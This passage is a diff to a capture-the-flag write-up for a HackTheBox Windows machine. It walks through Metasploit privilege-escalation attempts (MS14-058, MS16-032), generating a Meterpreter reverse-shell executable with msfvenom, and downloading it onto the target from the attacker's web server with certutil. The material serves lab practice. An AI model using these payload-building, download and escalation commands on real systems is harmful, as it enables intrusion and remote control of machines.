@@ -507,7 +507,110 @@ Active sessions
 
   Id  Name  Type               Information                                                                       Connection
   --  ----  ----               -----------                                                                       ----------
-  1         shell x64/windows  Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All righ...  10.10.14.15:4444 -> 10.10.10.8:49166 (10.10.10.8)
-  2         shell x64/windows  Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All righ...  10.10.14.15:4444 -> 10.10.10.8:49167 (10.10.10.8)
-  3         shell windows                                                                                        10.10.14.15:4444 -> 10.10.10.8:49168 (10.10.10.8)
+  1         shell x64/windows  Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All righ...  10.10.x.x:4444 -> 10.10.10.8:49166 (10.10.10.8)
+  2         shell x64/windows  Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All righ...  10.10.x.x:4444 -> 10.10.10.8:49167 (10.10.10.8)
+  3         shell windows                                                                                        10.10.x.x:4444 -> 10.10.10.8:49168 (10.10.10.8)
 ```
+
+## 5. First Attempt on MS14-058 & MS16-032
+Upon getting a regular shell, let's try to elevate it with the Metasploit modules!
+
+First we try with `MS14-058`:
+```
+msf5 > use exploit/windows/local/ms14_058_track_popup_menu
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+   1   Windows x64
+
+
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set target 1
+target => 1
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
+...
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lhost 10.10.x.x
+lhost => 10.10.x.x
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set lport 4545
+lport => 4545
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
+session => 1
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > run
+
+[!] SESSION may not be compatible with this module.
+[*] Started reverse TCP handler on 10.10.x.x:4545 
+[-] Exploit failed: NoMethodError undefined method `reverse!' for nil:NilClass
+[*] Exploit completed, but no session was created.
+```
+Ah, SESSION may not be compatible with this module. This module was not successfully run.
+
+Let's try `MS16-032`:
+```
+msf5 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show targets
+...
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set target 1
+target => 1
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
+...
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.14.15
+lhost => 10.10.14.15
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 4545
+lport => 4545
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
+session => 1
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+[!] SESSION may not be compatible with this module.
+[*] Started reverse TCP handler on 10.10.14.15:4545 
+[-] Exploit aborted due to failure: none: Session is already elevated
+[+] Deleted 
+[*] Exploit completed, but no session was created.
+```
+Same thing, SESSION may not be compatible with this module. But Session is already elevated.. what??
+
+## 6. Second Attempt on MS14-058 & MS16-032
+Let's create a Meterpreter reverse shell payload, transfer and run it.
+```
+hippoeug@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=4545 -f exe -o meterpreter.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: meterpreter.exe
+```
+We now need to transfer this file over to the target machine. Using the previous infrastructure `sudo python -m SimpleHTTPServer 80`, we can host the file.
+
+Let's go back to the regular shell and download our hosted `meterpreter.exe`. We can refer to our old attempt on HTB, [Devel](https://github.com/HippoEug/HackTheBox/blob/main/Devel.md) where we used `certutil.exe` to download the payload.
+```
+msf5 > sessions -i 1
+[*] Starting interaction with 1...
+
+C:\Users\kostas\Desktop>certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter.exe" meterpreter.exe
+certutil.exe -urlcache -split -f "http://10.10.14.15:80/meterpreter.exe" meterpreter.exe
+****  Online  ****
+  0000  ...
+  1c00
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\kostas\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users\kostas\Desktop
+
+23/01/2021  04:59 ��    <DIR>          .
+23/01/2021  04:59 ��    <DIR>          ..
+18/03/2017  02:11 ��           760.320 hfs.exe
+23/01/2021  05:04 ��             7.168 meterpreter.exe
+               2 File(s)        767.488 bytes
+               2 Dir(s)  31.897.223.168 bytes free
+```
+We got our payload in successfully! However, the original flag is gone. Some guy must have deleted it.
